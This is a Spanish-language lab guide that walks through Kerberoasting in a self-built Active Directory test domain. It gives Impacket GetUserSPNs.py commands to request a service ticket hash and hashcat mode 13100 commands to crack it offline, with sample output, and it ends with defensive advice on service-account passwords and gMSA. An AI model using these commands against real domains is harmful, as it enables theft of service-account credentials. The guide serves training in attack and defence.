# Práctica de Laboratorio: Kerberoasting

**Objetivo:** Explotar la configuración de Kerberos para obtener el hash de una cuenta de servicio y crackearlo offline para obtener su contraseña en texto plano.

**Requisitos Previos:**
*   Haber completado la guía de montaje del laboratorio de Active Directory (`00-Guia-Montaje_Lab_AD.md`).
*   Tener un dominio funcional (`laboratorio.local`).
*   Tener una cuenta de servicio con un SPN configurado (`sql_service`).
*   Tener acceso a la red con **cualquier cuenta de usuario del dominio**. Para esta práctica, crearemos un usuario sin privilegios.

---

## Parte 1: Preparación del Entorno

### Paso 1: Crear un Usuario de Dominio sin Privilegios

En un ataque real, obtendrías estas credenciales mediante phishing, explotación, etc. Aquí, las crearemos nosotros.

1.  **En el Controlador de Dominio (DC)**, abre `Usuarios y equipos de Active Directory`.
2.  Crea un nuevo usuario:
    *   **Nombre de usuario:** `atacante`
    *   **Contraseña:** `Atacante1234`
    *   Desmarca "El usuario debe cambiar la contraseña..." y asegúrate de que no sea miembro de ningún grupo con privilegios (por defecto, será miembro de "Usuarios del dominio", lo cual es perfecto).

### Paso 2: Configurar el DNS en Kali Linux

Para que las herramientas de Kali puedan resolver los nombres del dominio `laboratorio.local`, debes configurar el DNS de tu máquina atacante.

1.  Edita el archivo `/etc/resolv.conf` en tu máquina Kali.
    ```bash
    sudo nano /etc/resolv.conf
    ```
2.  Asegúrate de que la primera línea (`nameserver`) apunte **únicamente** a la IP de tu Controlador de Dominio.
    ```
    nameserver [IP_DEL_CONTROLADOR_DE_DOMINIO]
    ```
3.  Guarda y cierra el archivo.

---

## Parte 2: Ejecución del Ataque de Kerberoasting

### Paso 1: Descubrir y Solicitar los Tickets (Kerberoasting)

Usaremos la herramienta `GetUserSPNs.py` de la suite Impacket. Esta herramienta automatiza el proceso de buscar usuarios con SPN y solicitar los Tickets de Servicio (TGS) para ellos.

Desde tu máquina Kali, ejecuta el siguiente comando:

```bash
# Sintaxis: GetUserSPNs.py <dominio>/<usuario> -dc-ip <IP_DC> -request

GetUserSPNs.py laboratorio.local/atacante -dc-ip [IP_DEL_CONTROLADOR_DE_DOMINIO] -request
```

*   Te pedirá la contraseña del usuario `atacante` (`Atacante1234`).
*   La opción `-request` es la que solicita el TGS.

**Resultado Esperado:**

La herramienta devolverá el TGS para la cuenta `sql_service`. La parte importante es la cadena de texto larga que parece un hash. Este es el ticket cifrado que contiene el hash de la contraseña de la cuenta de servicio.

```
ServicePrincipalName  Name         MemberOf                                          PasswordLastSet             LastLogon                   
--------------------  -----------  ------------------------------------------------  --------------------------  --------------------------  
MSSQLSvc/dc-01.laboratorio.local:1433  sql_service  CN=Users,DC=laboratorio,DC=local  2023-10-27 10:00:00  2023-10-27 10:00:00  

$krb5tgs$23$*sql_service$laboratorio.local$MSSQLSvc/dc-01.laboratorio.local:1433*<...hash_largo...>
```

### Paso 2: Preparar el Hash para Crackear

Copia la línea completa que empieza por `$krb5tgs$23$...` y guárdala en un archivo de texto en tu máquina Kali.

```bash
echo "$krb5tgs$23$*sql_service$laboratorio.local$MSSQLSvc/dc-01.laboratorio.local:1433*<...hash_largo...>" > hash_kerberos.txt
```

### Paso 3: Crackear el Hash con Hashcat

Ahora, usaremos Hashcat para crackear este hash offline. Necesitaremos una lista de contraseñas (un diccionario). Para este ejemplo, usaremos la famosa `rockyou.txt` (si no la tienes, puedes instalarla con `sudo apt-get install rockyou`).

El modo de Hashcat para los hashes de Kerberoasting (TGS-REP) es el **13100**.

```bash
# Sintaxis: hashcat -m <modo> <archivo_hash> <diccionario>

hashcat -m 13100 hash_kerberos.txt /usr/share/wordlists/rockyou.txt
```

**Resultado Esperado:**

Si la contraseña de la cuenta de servicio (`ServicioSQL1234`) está en el diccionario, Hashcat la encontrará en poco tiempo.

```
$krb5tgs$23$*...  --> Hash completo

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*sql_service$laboratorio.local$MSSQL... 
Time.Started.....: [...]
Time.Estimated...: [...]
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
[...]        

Recovered........: 1/1 (100.00%)

$krb5tgs$23$*sql_service$laboratorio.local$MSSQLSvc/dc-01.laboratorio.local:1433*...:ServicioSQL1234
```

---

## Conclusión

¡Has obtenido la contraseña en texto plano de una cuenta de servicio! (`ServicioSQL1234`).

Este ataque es extremadamente sigiloso porque solo realiza acciones legítimas dentro del protocolo Kerberos. Un atacante no necesita privilegios y puede obtener credenciales de cuentas potencialmente muy poderosas. Esto demuestra por qué es **crítico** usar contraseñas extremadamente largas y complejas para las cuentas de servicio o, preferiblemente, usar cuentas gMSA gestionadas por el propio AD.